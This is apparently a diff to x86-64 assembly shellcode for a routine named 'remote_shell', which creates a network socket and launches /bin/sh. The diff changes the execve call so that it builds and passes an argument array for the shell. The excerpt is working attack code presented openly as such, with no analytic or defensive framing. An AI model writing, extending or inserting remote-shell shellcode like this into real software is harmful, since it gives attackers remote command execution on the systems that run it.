@@ -1,5 +1,5 @@
 remote_shell:
-	enter sockaddr_in_size, 0
+	enter REMOTE_SHELL_STACK_SIZE, 0
     ; Create socket
     mov rdi, AF_INET
     mov rsi, SOCK_STREAM
@@ -64,9 +64,17 @@ remote_shell:
     inc rsi
     syscall
 
+    lea rdi, [rel bin_sh.sh]
+    mov [rsp + sockaddr_in_size], rdi
+    lea rdi, [rel bin_sh.arg1]
+    mov [rsp + sockaddr_in_size + 8], rdi
+    lea rdi, [rel bin_sh.arg2]
+    mov [rsp + sockaddr_in_size + 16], rdi
+    xor rdi, rdi
+    mov [rsp + sockaddr_in_size + 24], rdi
     ; Execute /bin/sh 
     lea rdi, [rel bin_sh]
-    xor rsi, rsi
+    lea rsi, [rsp + sockaddr_in_size]
     xor rdx, rdx
     mov rax, SYS_EXECVE
     syscall
